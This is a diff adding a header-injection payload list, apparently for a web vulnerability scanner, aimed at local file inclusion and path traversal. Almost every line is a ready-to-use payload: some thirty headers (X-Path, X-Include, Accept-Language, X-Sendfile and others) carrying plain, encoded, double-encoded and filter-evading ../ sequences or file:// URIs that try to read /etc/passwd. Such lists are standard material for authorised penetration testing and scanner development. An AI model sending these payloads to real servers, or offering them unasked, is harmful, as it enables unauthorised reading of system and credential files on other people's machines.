@@ -1,0 +1,31 @@
+# LFI / path traversal via headers — header + payload collection
+# OOB marker: $collabplz (auto-replaced by Burp Collaborator, or use -oob <domain>)
+# Fingerprints: fingerprints/lfi.txt (nuclei-style regexes)
+X-Path: ../../../../etc/passwd
+X-Path: ....//....//....//etc/passwd
+X-Path: ..%2f..%2f..%2fetc%2fpasswd
+X-Path: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+X-Path: ..%252f..%252f..%252fetc%252fpasswd
+X-Path: file:///etc/passwd
+X-File: ../../../../etc/passwd
+X-File-Name: ../../../../etc/passwd
+X-Include: ../../../../etc/passwd
+X-Include-Path: ../../../../etc/passwd
+X-Page: ../../../../etc/passwd
+X-Template: ../../../../etc/passwd
+X-Config: ../../../../etc/passwd
+X-Load: ../../../../etc/passwd
+X-Document: ../../../../etc/passwd
+X-Localization: ../../../../etc/passwd
+X-Locale: ../../../../etc/passwd
+X-Resource: ../../../../etc/passwd
+X-Asset: ../../../../etc/passwd
+X-Base-Path: ../../../../etc/passwd
+X-Content-Path: ../../../../etc/passwd
+X-Forwarded-Resource: ../../../../etc/passwd
+Accept-Language: en_US/../../../../../../etc/passwd
+Accept-Language: ../../../../../../etc/passwd
+X-Original-URL: /etc/passwd
+X-Rewrite-URL: /etc/passwd
+X-Accel-Redirect: /etc/passwd
+X-Sendfile: /etc/passwd
